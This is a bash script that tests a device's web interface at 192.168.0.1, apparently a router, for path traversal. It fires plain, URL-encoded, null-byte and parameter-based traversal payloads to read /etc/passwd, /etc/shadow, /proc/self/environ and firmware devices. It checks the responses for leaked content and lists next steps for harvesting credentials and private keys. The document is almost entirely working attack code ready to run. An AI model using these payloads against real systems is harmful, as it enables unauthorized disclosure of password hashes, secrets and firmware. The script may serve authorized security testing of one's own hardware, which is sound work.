#!/bin/bash
# Path traversal testing - attempt to read system files
# Tests various endpoints and traversal techniques

TARGET="192.168.0.1"
OUTPUT_DIR="../recon/api/path_traversal_tests"

mkdir -p "$OUTPUT_DIR"

echo "=== Path Traversal Testing ==="
echo "Target: $TARGET"
echo "Output: $OUTPUT_DIR/"
echo

# Common files to try reading
declare -a files=(
    "etc/passwd"
    "etc/shadow"
    "etc/hosts"
    "proc/version"
    "proc/cpuinfo"
    "proc/cmdline"
    "proc/self/cmdline"
    "proc/self/maps"
    "proc/self/environ"
    "dev/mtd0"
    "dev/mtdblock0"
    "tmp/"
    "var/log/messages"
)

# Traversal patterns to test
declare -a patterns=(
    "../"
    "../../"
    "../../../"
    "../../../../"
    "../../../../../"
    "../../../../../../"
    "../../../../../../../"
    "../../../../../../../../"
)

echo "[*] Test 1: Direct path traversal from root"
echo

for file in "${files[@]}"; do
    echo "Testing: /$file"
    curl -s -o "$OUTPUT_DIR/root_${file//\//_}.txt" "http://$TARGET/$file" 2>&1

    # Check if we got something other than 404
    if ! grep -q "404" "$OUTPUT_DIR/root_${file//\//_}.txt" 2>/dev/null; then
        size=$(wc -c < "$OUTPUT_DIR/root_${file//\//_}.txt")
        if [ "$size" -gt 200 ]; then
            echo "  ⚠️  Got $size bytes (may be valid!)"
        fi
    fi
done

echo
echo "[*] Test 2: Traversal from /test endpoint"
echo

for pattern in "${patterns[@]}"; do
    for file in "etc/passwd" "proc/version" "proc/cmdline"; do
        url="http://$TARGET/test/${pattern}${file}"
        output="$OUTPUT_DIR/test_${pattern//\//_}_${file//\//_}.txt"

        echo "Testing: /test/${pattern}${file}"
        curl -s -o "$output" "$url" 2>&1

        # Check response
        if ! grep -q "404\|Page not found" "$output" 2>/dev/null; then
            size=$(wc -c < "$output")
            if [ "$size" -gt 200 ]; then
                echo "  ⚠️  Got $size bytes - checking content..."
                head -3 "$output" | grep -q "root:\|Linux version\|BOOT_IMAGE" && echo "  🚨 VALID FILE CONTENT!"
            fi
        fi
    done
done

echo
echo "[*] Test 3: Encoded traversal sequences"
echo

# URL-encoded ../ sequences
declare -a encoded=(
    "%2e%2e%2f"      # ../
    "%2e%2e/"        # ../
    "..%2f"          # ../
    "%2e%2e%5c"      # ..\
)

for enc in "${encoded[@]}"; do
    url="http://$TARGET/${enc}${enc}${enc}etc/passwd"
    output="$OUTPUT_DIR/encoded_$(echo $enc | sed 's/%//g').txt"

    echo "Testing: ${enc}${enc}${enc}etc/passwd"
    curl -s -o "$output" "$url" 2>&1

    if ! grep -q "404" "$output" 2>/dev/null; then
        size=$(wc -c < "$output")
        if [ "$size" -gt 200 ]; then
            echo "  ⚠️  Got $size bytes!"
            head -3 "$output" | grep -q "root:" && echo "  🚨 /etc/passwd LEAKED!"
        fi
    fi
done

echo
echo "[*] Test 4: Null byte injection (legacy)"
echo

curl -s -o "$OUTPUT_DIR/null_byte_etc_passwd.txt" "http://$TARGET/../../../etc/passwd%00.json" 2>&1
curl -s -o "$OUTPUT_DIR/null_byte_proc_version.txt" "http://$TARGET/../../../proc/version%00.html" 2>&1

echo
echo "[*] Test 5: Check known endpoints with traversal parameters"
echo

declare -a param_endpoints=(
    "wifi_status.json?file=../../../../etc/passwd"
    "wifi_status.json?path=../../../../etc/passwd"
    "wifi_status.json?../../etc/passwd"
    "status.json?file=../../../../proc/version"
)

for endpoint in "${param_endpoints[@]}"; do
    output="$OUTPUT_DIR/param_${endpoint//[^a-zA-Z0-9]/_}.txt"
    echo "Testing: /$endpoint"
    curl -s -o "$output" "http://$TARGET/$endpoint" 2>&1

    if grep -q "root:\|Linux version" "$output" 2>/dev/null; then
        echo "  🚨 VULNERABLE! File content leaked!"
    fi
done

echo
echo "=== Analysis ==="
echo

# Count successful reads
successful=0
for f in "$OUTPUT_DIR"/*.txt; do
    if [ -f "$f" ]; then
        # Check if file contains indicators of success
        if grep -q "root:x:\|Linux version\|BOOT_IMAGE\|processor\|MemTotal" "$f" 2>/dev/null; then
            echo "✓ Potential success: $(basename $f)"
            successful=$((successful + 1))
        fi
    fi
done

echo
if [ $successful -gt 0 ]; then
    echo "🚨 PATH TRAVERSAL VULNERABILITY FOUND!"
    echo "   $successful file(s) potentially readable"
    echo
    echo "Next steps:"
    echo "1. Verify file contents are legitimate"
    echo "2. Try to read firmware (/dev/mtd0, /dev/mtdblock0)"
    echo "3. Look for credentials, private keys, config files"
    echo "4. Document exact working payload"
else
    echo "✓ No path traversal vulnerability detected"
    echo
    echo "Device appears to:"
    echo "  - Properly validate/sanitize paths"
    echo "  - Block directory traversal attempts"
    echo "  - Not expose filesystem via web interface"
fi

echo
echo "All test outputs saved to: $OUTPUT_DIR/"
echo "Review files manually for any interesting content"
